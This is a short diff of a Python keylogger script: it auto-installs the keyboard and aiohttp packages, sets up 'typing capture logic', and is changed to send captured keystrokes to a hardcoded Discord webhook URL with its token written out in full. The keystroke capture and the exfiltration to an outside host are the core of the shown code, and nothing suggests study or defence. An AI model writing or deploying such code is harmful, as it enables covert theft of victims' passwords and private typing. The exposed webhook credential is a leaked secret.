@@ -1,4 +1,4 @@
-# 1 Auto-install keyboard + aiohttp if not present
+# 1️ Auto-install keyboard + aiohttp if not present
 import subprocess
 import sys
 import threading
@@ -14,13 +14,13 @@ import keyboard
 import asyncio
 import aiohttp
 
-# 2 Webhook URL (must be provided externally)
-WEBHOOK_URL = WEBHOOK  # this will fail if WEBHOOK is not injected
+# 2️⃣ Webhook URL (hardcoded here)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1418087043527086120/7q_3-NW0R4eFxRLEPO3fYaZFWnqsP0ZMnEw6Skl2sDppkKh5C89ELFYdeJ7SFzlBe-mn"  # <-- put your webhook here
 
-# 3 Typing capture logic
+# 3️⃣ Typing capture logic
 typed_text = ""
 
-#  Create loop and run it in background
+# ✅ Create loop and run it in background
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
